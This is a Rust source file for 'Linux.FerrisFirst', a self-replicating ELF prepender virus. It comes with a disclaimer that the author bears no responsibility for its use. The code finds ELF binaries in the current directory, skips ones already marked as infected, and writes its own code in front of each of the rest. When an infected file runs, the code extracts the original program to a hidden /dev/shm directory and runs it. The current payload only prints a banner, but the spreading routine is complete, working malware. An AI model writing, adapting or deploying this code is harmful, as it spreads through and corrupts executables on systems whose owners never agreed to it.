//! Linux.FerrisFirst is a simple ELF prepender virus by Kyo (2021)
//! An accompanying README.md is also provided in this repository.
//! 
//! This code is shared in the spirit of free information. I am not responsible 
//! for how you apply this knowledge or code.
//! 
//! This Rust virus will build on standard nightly Rust with no additional
//! dependencies, but patching the code may be necessary for offsets to work.
//! This patching is handled automatically but `build.sh` in this repository.
use std::{env, fs};
use std::path::PathBuf;
use std::process::Command;
use std::os::unix::fs::PermissionsExt;

const BASE_DIR: &str = "/dev/shm/.ferris_first/";
const ELF_MAGIC: &[u8; 4] = &[0x7f, 0x45, 0x4c, 0x46];
const INFECTION_MARK: &[u8; 8] = b"tmp.out\xff";
const VIRUS_SIZE: usize = 289000; // Placeholder value

fn is_elf(bytes: &[u8]) -> bool {
    &bytes[..4] == ELF_MAGIC
}

fn is_infected(bytes: &[u8]) -> bool {
    let mut cur = 0;
    for &byte in bytes {
        if byte == INFECTION_MARK[cur] {
            cur += 1;
        } else {
            cur = 0;
        }
        if cur == INFECTION_MARK.len() {
            return true;
        }
    }

    false
}

/// Finds and infects other ELF files
fn spread_and_infect(dir: &str, virus: &[u8]) {
    let entries: Vec<fs::DirEntry> = match fs::read_dir(dir) {
        Ok(v) => v.filter_map(Result::ok).collect(), // Discard `Err`s
        Err(_) => return,
    };

    for entry in entries {
        let contents = match fs::read(entry.path()) {
            Ok(v) => v,
            Err(_) => continue, // Skip if unable to read (bad permissions etc)
        };

        // Skip if this is not an ELF file
        if !is_elf(&contents) { continue; }

        // Skip if this file is already infected
        if is_infected(&contents) { continue; }

        // Infect this file ignoring errors
        let mut new_file = vec![];
        new_file.extend_from_slice(&virus);
        new_file.extend_from_slice(&contents);
        let _ = fs::write(entry.path(), &new_file);
    }
}

/// Code that is executed when an infected file is ran
fn virus_main() {
    println!("\x1b[92m{}\x1b[0m", ".: tmp.out :.");
}

/// Extracts and execute the host code
fn execute_host(name: &String, contents: &[u8], args: &[String]) {
    // Will not fail since we know name is a valid path
    let canon = fs::canonicalize(name).unwrap();
    let mut path = PathBuf::from(BASE_DIR);
    path.push(canon.strip_prefix("/").unwrap());
    let dir = path.parent().unwrap();
    let perms = fs::Permissions::from_mode(0o700);
    
    // Create parent directory, file, and set permissions
    if let Err(_) = fs::create_dir_all(dir) { return; }
    if let Err(_) = fs::write(&path, &contents) { return; }    
    if let Err(_) = fs::set_permissions(&path, perms) { return; }

    let _ = Command::new(&path).args(args).status(); // Discard Result
    if let Err(_) = fs::remove_file(&path) { return; }
}

fn main() {
    let args: Vec<String> = env::args().collect();
    let my_name = &args[0];
    if let Ok(my_code) = fs::read(my_name) {
        // Spread and infect neighboring ELFs
        spread_and_infect(".", &my_code[..VIRUS_SIZE]);

        // Run the virus if there is a host attached
        if my_code.len() > VIRUS_SIZE {
            virus_main();
            execute_host(&my_name, &my_code[VIRUS_SIZE..], &args[1..]);
        }
    }
}

